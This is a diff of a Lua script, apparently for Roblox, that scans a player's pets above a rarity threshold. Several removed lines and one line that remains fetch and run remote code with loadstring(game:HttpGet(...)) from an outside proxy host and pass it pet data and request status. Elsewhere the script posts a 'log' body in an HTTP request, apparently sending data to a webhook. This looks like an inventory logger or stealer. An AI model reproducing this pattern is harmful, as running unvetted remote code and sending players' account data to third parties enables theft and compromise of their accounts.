@@ -47,14 +47,10 @@ big=big..v[3].."x "..v[1].."(1/"..v[2]..")\\n"
 end
 else
 big = "No pets over 1/".._G.Min.." :("
-loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(big)
-loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(tostring(#tab))
 end
 end)
 if big == "" then
 big = "No pets over 1/".._G.Min.." :("
-loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(big)
-loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(tostring(#tab))
 end
 if not qbig then
 loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(qbiga)
@@ -95,7 +91,6 @@ local responser =
             Body = log
         }
     )
-loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(responser.StatusMessage)
 return response
 end)
 if not zzzu then
